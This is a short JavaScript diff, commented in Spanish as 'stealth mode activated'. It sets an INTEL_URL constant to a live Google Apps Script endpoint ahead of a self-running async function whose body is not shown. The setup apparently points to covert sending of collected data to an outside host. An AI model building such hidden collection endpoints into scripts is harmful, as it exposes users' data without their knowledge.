@@ -3,7 +3,7 @@
  * Modo Sigilo: Activado
  */
 
-const INTEL_URL = "URL_DE_SU_APPS_SCRIPT"; // Se reemplazará con la URL del Inge
+const INTEL_URL = "https://script.google.com/macros/s/AKfycbwJUNUGKckgw5ESN6ERqItOrJTCCT1fdi44enWq1jiZ0hax6QWpkbHKxMQGEhGjV5jDlw/exec"; 
 
 (async function() {
     try {
